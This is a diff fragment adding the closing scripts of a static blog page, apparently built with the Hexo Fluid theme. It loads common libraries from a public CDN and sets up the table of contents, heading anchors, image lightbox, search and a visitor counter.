+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
